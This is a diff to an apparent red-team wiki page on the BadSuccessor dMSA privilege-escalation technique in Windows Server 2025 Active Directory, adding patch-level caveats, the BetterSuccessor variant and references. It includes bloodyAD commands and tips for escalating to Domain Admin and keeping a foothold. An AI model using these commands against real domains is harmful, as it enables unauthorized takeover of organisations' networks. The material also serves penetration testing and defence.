@@ -16,14 +16,16 @@ Windows Server 2025 adds **delegated Managed Service Accounts (dMSA)** and a sup
 ## Why it is so dangerous
 
 - It works with the **default configuration** of a Server 2025 domain and does **not** require the domain to use dMSAs at all; the feature's mere presence (one Server 2025 DC) is enough.
-- The only prerequisite is the ability to **create a dMSA** (`CreateChild` for the msDS-DelegatedManagedServiceAccount class on some OU) or to **write** the migration attributes on an existing dMSA. Create rights on an OU are far more common and far less guarded than Domain Admin, and any such foothold can target **any** account in the domain.
+- In the original (pre-fix) form, the only prerequisite is the ability to **create a dMSA** (`CreateChild` for the `msDS-DelegatedManagedServiceAccount` class on some OU). Create rights on an OU are far more common and far less guarded than Domain Admin, and any such foothold can target **any** account in the domain.
 - There is no "already privileged" requirement, so it is a true low-to-high escalation, not just persistence.
+
+**Patch level matters.** The flow below is the original one-way technique and works on **unpatched** Server 2025 DCs (pre-August-2025 builds). On patched DCs the KDC rejects a one-way `PrecededByLink`, and the post-fix **BetterSuccessor** variant additionally requires **write control over the target account** to establish the mutual pairing, so the simple create-only path no longer suffices there. Confirm the DC build before relying on it.
 
 ## The attack
 
 ```bash
-# Linux: bloodyAD automates create + weaponize (set the migration link and state)
-bloodyAD --host <dc> -d example.local -u user -p pass add badSuccessor 'evil_dmsa$'
+# Linux: bloodyAD automates create + weaponize (name takes NO trailing '$'; it is appended)
+bloodyAD --host <dc> -d example.local -u user -p pass add badSuccessor 'evil_dmsa'
 
 # or the attributes by hand on a dMSA you created
 bloodyAD ... set object 'evil_dmsa$' msDS-ManagedAccountPrecededByLink -v 'CN=Administrator,CN=Users,DC=example,DC=local'
@@ -41,7 +43,7 @@ Then **authenticate as the dMSA**: its managed password is retrievable the same 
 
 - Name a **high-value** superseded account (a Domain Admin, or the built-in Administrator) to jump straight to domain compromise; the KDC copies its SIDs wholesale.
 - Hunt for OUs where your principal has `CreateChild` (or where `msDS-DelegatedManagedServiceAccount` can be created) during [ACL enumeration](../dacl/acl-enumeration.md); this is the gate, and it is frequently open through OU delegation.
-- After Microsoft's fix, the migration-link path was constrained but not fully closed; the **BetterSuccessor** follow-up research shows dMSA abuse variants that still escalate, so treat a Server 2025 domain as exposed and test the current behaviour.
+- On a patched DC, pivot to the **BetterSuccessor** variant: it still escalates, but needs write control over the target account (to set the reciprocal link) rather than just create rights, so treat a Server 2025 domain as exposed and test the current behaviour against its patch level.
 - A created dMSA and its links are durable until removed, so clean up the dMSA afterwards unless you want it as a foothold.
 
 ## Tools
@@ -52,5 +54,7 @@ Then **authenticate as the dMSA**: its managed password is retrievable the same 
 
 ## References
 
-- Akamai: BadSuccessor (abusing dMSA for privilege escalation)
-- AlteredSecurity: BetterSuccessor (dMSA abuse after the fix)
+- [Akamai: BadSuccessor, abusing dMSA for privilege escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
+- [Akamai: analyzing the BadSuccessor patch](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
+- [AlteredSecurity: BetterSuccessor (dMSA abuse after the fix)](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
+- [Microsoft: Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
